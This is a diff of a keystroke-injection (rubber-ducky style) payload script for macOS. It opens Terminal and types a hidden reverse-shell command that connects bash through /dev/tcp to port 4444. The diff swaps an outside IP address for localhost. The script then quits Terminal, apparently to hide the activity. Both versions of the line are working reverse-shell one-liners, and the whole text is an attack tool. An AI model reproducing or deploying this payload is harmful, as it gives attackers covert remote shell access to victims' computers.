@@ -8,6 +8,6 @@ STRING terminal.app
 DELAY 200
 ENTER
 DELAY 2000
-STRING screen -dm bash -c 'bash --init-file <(echo bash -i|& /dev/tcp/5.90.113.91/4444 0|&1; history -r)'
+STRING screen -dm bash -c 'bash --init-file <(echo bash -i|& /dev/tcp/127.0.0.1/4444 0|&1; history -r)'
 DELAY 2000
 GUI q
